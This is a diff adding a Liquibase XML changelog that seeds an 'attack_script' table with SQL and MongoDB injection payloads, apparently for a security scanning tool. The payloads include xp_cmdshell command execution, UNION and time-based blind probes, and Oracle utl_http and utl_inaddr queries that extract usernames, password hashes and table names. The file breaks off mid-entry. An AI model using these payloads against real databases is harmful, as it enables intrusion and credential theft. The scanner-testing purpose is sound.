@@ -1,0 +1,1088 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<databaseChangeLog
+        xmlns="http://www.liquibase.org/xml/ns/dbchangelog/1.9"
+        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+        xsi:schemaLocation="http://www.liquibase.org/xml/ns/dbchangelog/1.9
+                      http://www.liquibase.org/xml/ns/dbchangelog/dbchangelog-1.9.xsd">
+
+    <changeSet author="user" id="005">
+
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '; --');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' --');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"'); --');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"'; exec master..xp_cmdshell "'ping 10.10.1.2"'--');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' grant connect to name; grant resource to name; --');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' or 1=1 --');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' union (select @@version) --');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' union (select NULL, (select @@version)) --');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' union (select NULL, NULL, (select @@version)) --');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' union (select NULL, NULL, NULL,  (select @@version)) --');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' union (select NULL, NULL, NULL, NULL,  (select @@version)) --');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"'; if not(substring((select @@version),25,1) <> 0) waitfor delay "'0:0:2"' --');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"'; if not(substring((select @@version),25,1) <> 5) waitfor delay "'0:0:2"' --');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"'; if not(substring((select @@version),25,1) <> 8) waitfor delay "'0:0:2"' --');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"'; if not(substring((select @@version),24,1) <> 1) waitfor delay "'0:0:2"' --');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"'; if not(select system_user) <> "'sa"' waitfor delay "'0:0:2"' --');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"'; if is_srvrolemember("'sysadmin"') > 0 waitfor delay "'0:0:2"' -- ');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"'; if not((select serverproperty("'isintegratedsecurityonly"')) <> 1) waitfor delay "'0:0:2"' --');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"'; if not((select serverproperty("'isintegratedsecurityonly"')) <> 0) waitfor delay "'0:0:2"' --"');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '1"'1');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '1 exec sp_ (or exec xp_)');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '1 and 1=1');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '1"' and 1=(select count(*) from tablenames); --');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '1 or 1=1');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '1"' or "'1"'="'1');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '1or1=1');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '1"'or"'1"'="'1');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, 'fake@ema"'or"'il.nl"'="'il.nl');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '1');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '1 and user_name() = "'dbo"'');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '\"'; desc users; --');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '1\""'1');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '1"' and non_existant_table = "'1');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' or username is not NULL or username = "'');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '1 and ascii(lower(substring((select top 1 name from sysobjects where xtype="'u"'), 1, 1))) > 116');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = "'u"' --');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '1 uni/**/on select all from where');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, 'true, $where: "'1 == 1"'');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, ', $where: "'1 == 1"'');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '$where: "'1 == 1"'');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"', $where: "'1 == 1"'');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '1, $where: "'1 == 1"'');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '{ $ne: 1 }');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"', $or: [ {}, { "'a"':"'a');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' } ], $comment:"'successful MongoDB injection"'');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, 'db.injection.insert({success:1});');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, 'db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '|| 1==1');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' && this.password.match(/.*/)//+%00');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' && this.passwordzz.match(/.*/)//+%00');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"'%20%26%26%20this.password.match(/.*/)//+%00');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"'%20%26%26%20this.passwordzz.match(/.*/)//+%00');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '{$gt: "'"'}');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '[$ne]=1');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"';sleep(5000);');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"';sleep(5000);"'');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"';sleep(5000);+"'');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"’ or "‘1"’="’1');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' or "'1"'="'1');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"'||utl_http.request("'httP://192.168.1.1/"')||"'');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' || myappadmin.adduser("'admin"', "'newpass"') || "'');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
